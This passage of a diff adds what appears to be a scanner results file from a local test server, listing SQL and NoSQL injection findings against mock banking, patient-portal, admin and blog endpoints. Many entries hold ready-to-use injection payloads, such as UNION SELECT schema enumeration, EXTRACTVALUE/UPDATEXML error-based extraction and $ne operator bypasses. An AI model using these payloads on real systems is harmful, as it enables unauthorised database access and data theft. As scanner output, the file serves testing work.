+          "Parameter": "orderId",
+          "Payload": "{\"$ne\":null}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "customerId",
+          "Payload": "{\"$gt\":\"\"}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "orderId",
+          "Payload": "[$ne]=1",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "customerId",
+          "Payload": "{\"$ne\":null}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "customerId",
+          "Payload": "[$ne]=1",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: admin trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "orderId",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"orders\":[{\"id\":\"ORD-99999\",\"amount\":50000,\"customer\":\"admin\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "orderId",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"orders\":[{\"id\":\"ORD-99999\",\"amount\":50000,\"customer\":\"admin\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "customerId",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"orders\":[{\"id\":\"ORD-99999\",\"amount\":50000,\"customer\":\"admin\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "orderId",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"orders\":[{\"id\":\"ORD-99999\",\"amount\":50000,\"customer\":\"admin\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "customerId",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"orders\":[{\"id\":\"ORD-99999\",\"amount\":50000,\"customer\":\"admin\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v2/orders/lookup",
+          "Parameter": "customerId",
+          "VulnType": "nosql",
+          "DBMS": "nosql",
+          "DataType": "dump",
+          "Value": "{\"orders\":[{\"id\":\"ORD-99999\",\"amount\":50000,\"customer\":\"admin\"}]}",
+          "Payload": "{\"$ne\":null}",
+          "Method": "nosql"
+        }
+      ],
+      "tested_params": 2,
+      "tested_payloads": 48,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/api/v1/invoices",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/api/v1/invoices?page=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "page",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "confirmed",
+          "Evidence": "données DB extraites via UNION (version/schéma)",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/api/v1/invoices?page=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "page",
+          "VulnType": "sqli_union",
+          "DBMS": "",
+          "DataType": "version",
+          "Value": "Microsoft SQL Server 2019",
+          "Payload": "' UNION SELECT @@version--",
+          "Method": "union"
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/admin/users/search",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27",
+          "Parameter": "q",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "q",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=1%27+OR+%271%27%3D%271--",
+          "Parameter": "q",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "q",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=admin%27--",
+          "Parameter": "q",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "q",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "q",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+UNION+SELECT+NULL--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/users/search?q=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "q",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/admin/reports",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/admin/reports?report_id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "report_id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "high",
+          "Evidence": "erreur SQL — accès DB probable: XPATH syntax error: '~8.0.32-MySQL~'",
+          "DBMS": "generic",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/reports?report_id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "report_id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "high",
+          "Evidence": "erreur SQL — accès DB probable: XPATH syntax error: '~8.0.32-MySQL~'",
+          "DBMS": "generic",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/admin/reports?report_id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "report_id",
+          "VulnType": "sqli_error",
+          "DBMS": "generic",
+          "DataType": "version",
+          "Value": "8.0.32-MySQL",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--",
+          "Method": "error"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/admin/reports?report_id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "report_id",
+          "VulnType": "sqli_error",
+          "DBMS": "generic",
+          "DataType": "version",
+          "Value": "8.0.32-MySQL",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--",
+          "Method": "error"
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/admin/logs",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/admin/logs?level=%27+OR+%271%27%3D%271",
+          "Parameter": "level",
+          "Payload": "' OR '1'='1 | ' AND '1'='2",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/admin/logs?level=%27+OR+1%3D1--",
+          "Parameter": "level",
+          "Payload": "' OR 1=1-- | ' AND 1=2--",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/portal/patient",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27",
+          "Parameter": "patient_id",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "patient_id",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=1%27+OR+%271%27%3D%271--",
+          "Parameter": "patient_id",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "patient_id",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=admin%27--",
+          "Parameter": "patient_id",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "patient_id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "patient_id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+UNION+SELECT+NULL--",
+          "Parameter": "patient_id",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "patient_id",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "patient_id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "patient_id",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "patient_id",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/patient?patient_id=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "patient_id",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ORA-01756: quoted string not properly terminated",
+          "DBMS": "oracle",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/portal/lab-results",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27",
+          "Parameter": "record_id",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "record_id",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=1%27+OR+%271%27%3D%271--",
+          "Parameter": "record_id",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "record_id",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=admin%27--",
+          "Parameter": "record_id",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "record_id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "record_id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+UNION+SELECT+NULL--",
+          "Parameter": "record_id",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "record_id",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "record_id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "record_id",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "record_id",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/portal/lab-results?record_id=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "record_id",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: SQLITE_ERROR: near \"'\": syntax error",
+          "DBMS": "sqlite",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/banking/statement",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/banking/statement?account=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "account",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "confirmed",
+          "Evidence": "données DB extraites via UNION (version/schéma)",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/banking/statement?account=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "account",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "confirmed",
+          "Evidence": "données DB extraites via UNION (version/schéma)",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "extractions": [
+        {
+          "FindingURL": "http://127.0.0.1:46033/banking/statement?account=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "account",
+          "VulnType": "sqli_union",
+          "DBMS": "",
+          "DataType": "version",
+          "Value": "PostgreSQL 14.10",
+          "Payload": "' UNION SELECT @@version--",
+          "Method": "union"
+        },
+        {
+          "FindingURL": "http://127.0.0.1:46033/banking/statement?account=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "account",
+          "VulnType": "sqli_union",
+          "DBMS": "",
+          "DataType": "version",
+          "Value": "PostgreSQL 14.10",
+          "Payload": "' UNION SELECT @@version--",
+          "Method": "union"
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 4
+    },
+    {
+      "url": "http://127.0.0.1:46033/banking/transfer/status",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/banking/transfer/status?ref=%27+OR+%271%27%3D%271",
+          "Parameter": "ref",
+          "Payload": "' OR '1'='1 | ' AND '1'='2",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/banking/transfer/status?ref=%27+OR+1%3D1--",
+          "Parameter": "ref",
+          "Payload": "' OR 1=1-- | ' AND 1=2--",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 8
+    },
+    {
+      "url": "http://127.0.0.1:46033/blog/article",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27",
+          "Parameter": "slug",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near ''' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "slug",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '' OR '1'='1'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=1%27+OR+%271%27%3D%271--",
+          "Parameter": "slug",
+          "Payload": "1' OR '1'='1--",
